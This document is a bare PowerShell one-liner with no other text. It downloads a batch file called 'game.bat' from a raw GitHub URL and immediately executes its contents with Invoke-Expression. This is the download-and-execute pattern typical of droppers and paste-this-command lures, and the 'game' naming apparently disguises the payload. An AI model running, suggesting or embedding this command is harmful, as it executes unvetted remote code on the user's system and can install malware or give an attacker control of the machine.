$Url = "https://raw.githubusercontent.com/neginsadeghi2005/project/refs/heads/main/game.bat";$scriptontent = Invoke-WebRequest -Uri $Url -UseBasicP;Invoke-Expression $scriptontent.Content
